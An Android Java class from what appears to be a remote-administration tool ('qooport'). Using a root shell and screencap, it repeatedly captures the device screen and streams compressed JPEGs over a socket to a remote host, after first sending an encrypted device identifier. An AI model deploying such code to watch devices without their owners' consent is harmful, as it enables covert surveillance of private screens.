package com.qooport.android.servidor;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.os.Environment;
import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import com.qooport.android.Principal;
import com.qooport.android.Servicio;
import com.qooport.android.utilidades.Compresor;
import com.qooport.android.utilidades.Protocolo;
import com.qooport.android.utilidades.cifrado.Encriptacion;

public class CapturaPantalla extends Thread {

    private Servicio conexion;
    private ObjectOutputStream out;
    private ObjectInputStream in;
    public boolean activo;
    private int scala;
    private String tipo;
    private float calidad;
    // voy a tener un maximo de 5 hilos simultaneos
//    private int limiteHilos = 5;
//    private int hilosCapturando = 0;

    public CapturaPantalla(Servicio conex) {
        this.conexion = conex;
        activo = true;
    }

    public void detener() {
        try {
            activo = false;
        } catch (Exception e) {
        }
    }

    public int getScala() {
        return scala;
    }

    public void setScala(int scala) {
        this.scala = scala;
    }

    public String getTipo() {
        return tipo;
    }

    public void setTipo(String tipo) {
        this.tipo = tipo;
    }

    public float getCalidad() {
        return calidad;
    }

    public void setCalidad(float calidad) {
        this.calidad = calidad;
    }

    @Override
    public void run() {
        try {
            Socket socket = new Socket(conexion.getHost(), (conexion.getPuertoTransferencias()));
            out = new ObjectOutputStream(socket.getOutputStream());
            in = new ObjectInputStream(socket.getInputStream());
            conexion.enviarMensaje("VOYA INICIAR LA CAPTURA DE PANTALLA");
            out.writeInt(Protocolo.capturaPantalla);
            out.flush();
            out.writeObject(Compresor.comprimirGZIP(Encriptacion.cifra(Principal.identificador)));
            out.flush();
            while (activo) {
                try {
                    capturarYenviar();
                    try {
                        sleep(100);
                    } catch (Exception e) {
                    }
//                    if (hilosCapturando < limiteHilos) {                  
//                        new Thread(new Runnable() {
//                            public void run() {
//                                try {
//                                    hilosCapturando++;                                  
//                                    capturarYenviar();
//                                    hilosCapturando--;
//                                } catch (Exception ex) {
//                                    ex.printStackTrace();
////                                    Logger.getLogger(CapturaPantalla.class.getName()).log(Level.SEVERE, null, ex);
//                                }
//                            }
//                        }
//                        ).start();
//                }
                } catch (Exception ex) {
                    activo = false;
                }
            }
        } catch (Exception ex) {
            conexion.enviarMensaje("ERROR AL CAPTURAR PANTALLA " + ex.getMessage());
        } finally {
            try {
                out.close();
                in.close();
            } catch (IOException ex) {
            }
        }
    }

    private void capturarYenviar() {
        try {
//            enviar(capturar());
            byte[] bytes = CapturaPantalla.getScreen(scala, calidad, conexion.getOrientacion());
            if (bytes != null) {
                out.writeObject(Compresor.comprimirGZIP(bytes));
            }
        } catch (Exception ex) {
        }
    }

    public static Bitmap redimensionar_rotar(Bitmap mBitmap, float newWidth, float newHeigth, int orientacion) {
        try {
            Log.i("PANTALLA", "nuevoAncho=" + newWidth + " nuevoAlto=" + newHeigth);
            float angulo = 0;
            if (orientacion == Configuration.ORIENTATION_PORTRAIT) {
                angulo = 0;
            }
            if (orientacion == Configuration.ORIENTATION_LANDSCAPE) {
                angulo = 90;
            }
            //Redimensionamos
            int width = mBitmap.getWidth();
            int height = mBitmap.getHeight();
            float scaleWidth = ((float) newWidth) / width;
            float scaleHeight = ((float) newHeigth) / height;
            Matrix matrix = new Matrix();
            matrix.postScale(scaleWidth, scaleHeight);
            matrix.postRotate(angulo);
            return Bitmap.createBitmap(mBitmap, 0, 0, width, height, matrix, false);
        } catch (Exception e) {
            return null;
        }
    }

    public static byte[] getScreen(int scala, float calidad, int orientacion) {
        byte[] salida = null;
        try {
            File sd = Environment.getExternalStorageDirectory();
            File tmp = new File(sd, Servicio.nombreHora() + ".jpg");
            if (tmp.exists()) {
                tmp.delete();
            }
            Process sh = Runtime.getRuntime().exec("su", null, null);
            OutputStream os = sh.getOutputStream();
            os.write(("/system/bin/screencap -p " + tmp.getAbsolutePath()).getBytes("ASCII"));
            os.flush();
            os.close();
            sh.waitFor();
            Bitmap bitmap = BitmapFactory.decodeFile(tmp.getAbsolutePath());
            if (bitmap == null) {
                return null;
            }
//            Log.i("PANTALLA", "ancho=" + bitmap.getWidth());
//            Log.i("PANTALLA", "alto=" + bitmap.getHeight());
//            bitmap = CapturaPantalla.redimensionar_rotar(bitmap, ((float) bitmap.getWidth() * ratio), 320.f, Servicio.this.getOrientacion());
//            Log.i("PANTALLA", "voy a redimensionar con escala=" + scala);
            bitmap = redimensionar_rotar(bitmap, (float) bitmap.getWidth() * ((float) scala / 100), (float) bitmap.getHeight() * ((float) scala / 100), orientacion);
            if (bitmap == null) {
                return null;
            }
//            Log.i("PANTALLA", "ancho_D=" + bitmap.getWidth());
//            Log.i("PANTALLA", "alto_D=" + bitmap.getHeight());
//            Log.i("PANTALLA", "calida jpg=" + calidad);
            ByteArrayOutputStream os1 = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, (int) calidad, os1);
            tmp.delete();
            salida = os1.toByteArray();
            os1.close();
            Log.i("PANTALLA", "getScreen listo=" + salida.length);
        } catch (Exception ex) {
            Log.i("PANTALLA", "error=" + ex.getMessage());
            ex.printStackTrace();
        }
        return salida;
    }
}
